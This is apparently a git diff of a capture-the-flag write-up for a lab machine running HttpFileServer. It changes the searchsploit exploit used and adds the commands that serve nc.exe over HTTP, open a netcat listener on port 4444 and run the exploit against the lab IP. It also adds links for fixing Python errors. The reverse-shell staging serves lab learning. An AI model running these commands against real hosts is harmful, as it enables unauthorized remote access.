@@ -30,26 +30,33 @@ sudo nmap -Pn -n -sV -sC -O -p$ports 10.10.10.8 --open
 ```
 searchsploit httpfileserver
 
-searchsploit -m 49125
+searchsploit -m 39161
 ```
 
-![image](https://github.com/h4md153v63n/CTFs/assets/5091265/93e024da-a49f-4962-99db-5f8d93e10d7e)
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/160c6e02-5cc4-4c84-aa44-b51481749738)
 
-![image](https://github.com/h4md153v63n/CTFs/assets/5091265/9449a98a-3a39-469c-a5ba-c2a2b311393d)
+Change ip addres and port number:
 
-```
-cp /usr/share/windows-binaries/nc.exe .
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/fbbb8068-00c8-4bda-8ae5-9b062ae8d92a)
 
-sudo python3 -m http.server
-
-nc -nlvp 4444
-```
-
-
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a62cd8b5-3931-4863-9e43-c9bd8ca44602)
 
 
 ## Exploitation & Gaining Access
+```
+cp /usr/share/windows-binaries/nc.exe .
 
+sudo python3 -m http.server 80
+
+nc -nlvp 4444
+
+python3 39161.py 10.10.10.8 80
+
+python3 39161.py 10.10.10.8 80
+
+```
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/0b3ad525-c717-4f8c-a61c-6bf6381ab8f2)
 
 
 ## Privilege Escalation
@@ -75,7 +82,16 @@ nc -nlvp 4444
 
 
 ## Problems Solution
-+ x
++ **SyntaxError: (unicode error) 'unicodeescape' codec can't decode bytes in position 2-3: truncated \UXXXXXXXX escape:**
+  + https://www.geeksforgeeks.org/how-to-fix-syntaxerror-unicode-error-unicodeescape-codec-cant-decode-bytes/
+  + https://community.alteryx.com/t5/Alteryx-Designer-Desktop-Discussions/Error-unicodeescape-codec-can-t-decode-bytes/td-p/427540
++ **SyntaxError: Missing parentheses in call to 'print'. Did you mean print(...)?:**
++ **ModuleNotFoundError: No module named 'urllib2':**
+  + https://www.easytweaks.com/module-not-found-urllib2/
+  + https://youtu.be/jfD_9DoWGlI?t=63
+  + https://blog.finxter.com/fix-import-error-no-module-named-urllib2-python/
++ **ERROR: Could not find a version that satisfies the requirement urllib (from versions: none):**
+  + https://github.com/ThomasTJdev/python_gdork_sqli/issues/1
 
 
 ## For More
